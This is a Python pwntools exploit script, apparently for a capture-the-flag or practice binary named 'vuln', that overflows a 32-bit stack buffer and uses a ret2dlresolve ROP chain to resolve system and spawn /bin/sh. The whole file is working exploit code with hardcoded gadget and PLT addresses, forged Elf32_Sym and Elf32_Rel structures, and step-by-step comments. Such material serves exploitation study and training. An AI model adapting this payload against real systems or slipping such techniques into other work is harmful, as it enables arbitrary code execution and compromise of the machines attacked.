import struct
from pwn import *
elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
exploit_log_level = 3 # 0 : No log | 1 : Verbose | 2 : Debug
if exploit_log_level >= 2:
	context.log_level = 'debug'

dlresolve_payload = Ret2dlresolvePayload(elf, symbol='system', args=["/bin/sh"])

def print_bytes(a):
	print("[", end="")
	for elem in a:
		print(str(hex(elem))+", ", end="")
		if(elem == 0x0a):
			print("]\n[", end="")
	print("]")
def print_x(a):
	c = []
	i = 0
	for i in range(len(a)-4):
		c.append(bytearray())
	
		c[i] = bytearray([a[i], a[i+1], a[i+2], a[i+3]])

	print("[", end="")
	for elem in c:
		x = struct.unpack("I", elem)
		print(hex(x[0])+", ", end="")
	print("]")


def find_addr32_index(a, arr):
	for i in range(len(arr)):
		if arr[i] == a[0] and arr[i+1] == a[0+1] and arr[i+2] == a[0+2] and arr[i+3] == a[0+3]:
			return i
def find_addr32_in_arr(arr, startidx):
	values = bytearray()
	for i in range(4):
		values.append(arr[startidx+i])
	ret = struct.unpack("I", values)
	return ret[0]
def make_ropchain(padding, dlresolve):

	read_plt = 0x08049030
	resolver = 0x08049030-16

	payload = bytearray()
	payload += ('A'*padding).encode()
	payload += struct.pack("I", read_plt) # read@plt
	payload += struct.pack("I", 0x0804921a) # ropgadget : pop edi; pop ebp; ret
	payload += struct.pack("I", 0x00000000) # args[0] -> Null
	payload += struct.pack("I", dlresolve.data_addr) # args[1] -> Symbol name address (dlresolve.data_addr)
	payload += struct.pack("I", resolver) # [plt_init] system(dlresolve.data_addr+36) so dlresolve.data_addr+36 is the argument that will use system when it will get executed
	payload += struct.pack("I", dlresolve.reloc_index) # reloc index (dlresolve.reloc_index)
	payload += ("AAAA").encode() # return address (not important)
	payload += struct.pack("I", dlresolve.real_args[0]) # args[0] of system which will be written in the second payload (dlresolve.data_addr+36)
	return payload
def make_dlresolve_payload(dlresolve, arg="/bin/sh"):

	symbol_name = b"system"

	# like dlresolve_payload.payload
	payload = bytearray()
	# Write the symbol (system) to Symbol name addr
	payload += symbol_name
	payload += b"\x00"
	payload += b"A"*5
	# The SYMTAB structure (instance of the structure Elf32_Sym)
	payload += struct.pack("I", dlresolve.reloc_index+96) # index/offset of the symbol system in the structure
	payload += struct.pack("I", 0x00000000)*3 # other values in the struct (they're not important)
	# The JMPTAB structure (instance of the structure Elf32_Rel)
	payload += struct.pack("I", dlresolve_payload.data_addr) # Symbol name address (system)
	# For the r_info variable i extracted it direcly from the pwntools dlresolve payload :
	data_addr_index = find_addr32_index(struct.pack("I", dlresolve_payload.data_addr), dlresolve.payload)
	r_info = find_addr32_in_arr(dlresolve.payload, data_addr_index+4)
	if exploit_log_level >= 1:
		print("[*] r_info : "+str(hex(r_info)))
	payload += struct.pack("I", r_info)
	# Finally, the argument of the symbol
	payload += arg.encode() # which will be written to dlresolve.data_addr+36 and
	payload += b"\x00"
	return payload

if exploit_log_level >= 1:
	print("[*] Data addr : "+str(hex(dlresolve_payload.data_addr)))
	print("[*] Reloc index : "+str(hex(dlresolve_payload.reloc_index)))

payload1 = make_ropchain(76, dlresolve_payload)
payload2 = make_dlresolve_payload(dlresolve_payload, "/bin/sh")

fullpayload = payload1
fullpayload += "\n".encode()
fullpayload += payload2
# full payload for any usage

if exploit_log_level >= 2:
	print("[@] Full exploit payload : ")
	print_x(payload1)
	#print_x(dlresolve_payload.payload)
	print_x(payload2)

if exploit_log_level >= 1:
	print("[*] Sending the first ropchain...")
p.sendline(payload1)
if exploit_log_level >= 1:
	print("[*] Sending the dlresolve payload...")
# now the read is called and we pass all the relevant structures in
p.sendline(payload2) # if it's not working you can pass it the dlresolve_payload.payload

p.interactive()
